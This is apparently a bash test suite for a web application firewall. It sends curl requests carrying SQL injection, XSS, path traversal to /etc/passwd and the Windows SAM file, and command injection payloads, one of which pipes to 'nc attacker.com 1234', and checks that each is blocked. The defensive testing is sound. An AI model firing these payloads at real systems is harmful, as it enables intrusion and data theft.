#!/bin/bash

# WAF Testing Script
# Tests all major protection features

WAF_URL="${WAF_URL:-http://localhost:8080}"
COLOR_GREEN='\033[0;32m'
COLOR_RED='\033[0;31m'
COLOR_NC='\033[0m'

echo "🛡️  WAF Protection Test Suite"
echo "Testing WAF at: $WAF_URL"
echo "================================"

test_count=0
passed=0
failed=0

run_test() {
    local name="$1"
    local command="$2"
    local should_block="$3"
    
    test_count=$((test_count + 1))
    echo -n "Test $test_count: $name... "
    
    response=$(eval "$command" 2>&1)
    status_code=$(echo "$response" | grep -oP 'HTTP/\d\.\d \K\d+' | head -1)
    
    if [ "$should_block" = "true" ]; then
        if [ "$status_code" = "403" ] || [ "$status_code" = "429" ]; then
            echo -e "${COLOR_GREEN}✓ BLOCKED${COLOR_NC}"
            passed=$((passed + 1))
        else
            echo -e "${COLOR_RED}✗ NOT BLOCKED (Status: $status_code)${COLOR_NC}"
            failed=$((failed + 1))
        fi
    else
        if [ "$status_code" = "200" ]; then
            echo -e "${COLOR_GREEN}✓ ALLOWED${COLOR_NC}"
            passed=$((passed + 1))
        else
            echo -e "${COLOR_RED}✗ BLOCKED (Status: $status_code)${COLOR_NC}"
            failed=$((failed + 1))
        fi
    fi
}

echo ""
echo "=== SQL Injection Tests ==="

run_test "Basic SQL injection" \
    "curl -s -i '$WAF_URL/api/users?id=1%27%20OR%20%271%27=%271'" \
    "true"

run_test "UNION SELECT attack" \
    "curl -s -i '$WAF_URL/api/search?q=test%27%20UNION%20SELECT%20*%20FROM%20users--'" \
    "true"

run_test "Boolean-based blind SQLi" \
    "curl -s -i '$WAF_URL/api/product?id=1%20AND%201=1'" \
    "true"

run_test "Time-based blind SQLi" \
    "curl -s -i '$WAF_URL/api/item?id=1%27%20AND%20SLEEP(5)--'" \
    "true"

run_test "Safe database query" \
    "curl -s -i '$WAF_URL/api/products?category=electronics'" \
    "false"

echo ""
echo "=== XSS Tests ==="

run_test "Script tag injection" \
    "curl -s -i -X POST '$WAF_URL/api/comment' -H 'Content-Type: application/json' -d '{\"text\":\"<script>alert(1)</script>\"}'" \
    "true"

run_test "Event handler injection" \
    "curl -s -i '$WAF_URL/api/profile?name=<img%20src=x%20onerror=alert(1)>'" \
    "true"

run_test "JavaScript protocol" \
    "curl -s -i '$WAF_URL/api/link?url=javascript:alert(1)'" \
    "true"

run_test "Safe HTML content" \
    "curl -s -i -X POST '$WAF_URL/api/comment' -H 'Content-Type: application/json' -d '{\"text\":\"This is a normal comment\"}'" \
    "false"

echo ""
echo "=== Path Traversal Tests ==="

run_test "Basic path traversal" \
    "curl -s -i '$WAF_URL/api/file?path=../../etc/passwd'" \
    "true"

run_test "URL encoded traversal" \
    "curl -s -i '$WAF_URL/api/download?file=..%2F..%2Fetc%2Fpasswd'" \
    "true"

run_test "Windows path traversal" \
    "curl -s -i '$WAF_URL/api/view?doc=..\\..\\windows\\system32\\config\\sam'" \
    "true"

run_test "Safe file access" \
    "curl -s -i '$WAF_URL/api/file?path=documents/report.pdf'" \
    "false"

echo ""
echo "=== Command Injection Tests ==="

run_test "Shell command injection" \
    "curl -s -i '$WAF_URL/api/ping?host=127.0.0.1;cat%20/etc/passwd'" \
    "true"

run_test "Command substitution" \
    "curl -s -i '$WAF_URL/api/search?q=\$(whoami)'" \
    "true"

run_test "Pipe command" \
    "curl -s -i '$WAF_URL/api/log?file=error.log%20|%20nc%20attacker.com%201234'" \
    "true"

run_test "Safe command parameter" \
    "curl -s -i '$WAF_URL/api/status?service=web'" \
    "false"

echo ""
echo "=== Rate Limiting Tests ==="

echo -n "Test $((test_count + 1)): Rate limit enforcement... "
test_count=$((test_count + 1))

blocked=0
for i in {1..150}; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$WAF_URL/api/test")
    if [ "$response" = "429" ]; then
        blocked=1
        break
    fi
done

if [ $blocked -eq 1 ]; then
    echo -e "${COLOR_GREEN}✓ RATE LIMITED${COLOR_NC}"
    passed=$((passed + 1))
else
    echo -e "${COLOR_RED}✗ NOT RATE LIMITED${COLOR_NC}"
    failed=$((failed + 1))
fi

echo ""
echo "=== Suspicious Headers Tests ==="

run_test "Malicious User-Agent" \
    "curl -s -i -H 'User-Agent: sqlmap/1.0' '$WAF_URL/api/data'" \
    "true"

run_test "Normal User-Agent" \
    "curl -s -i -H 'User-Agent: Mozilla/5.0' '$WAF_URL/api/data'" \
    "false"

echo ""
echo "=== Results ==="
echo "================================"
echo "Total Tests: $test_count"
echo -e "Passed: ${COLOR_GREEN}$passed${COLOR_NC}"
echo -e "Failed: ${COLOR_RED}$failed${COLOR_NC}"

if [ $failed -eq 0 ]; then
    echo -e "\n${COLOR_GREEN}🎉 All tests passed!${COLOR_NC}"
    exit 0
else
    echo -e "\n${COLOR_RED}⚠️  Some tests failed!${COLOR_NC}"
    exit 1
fi
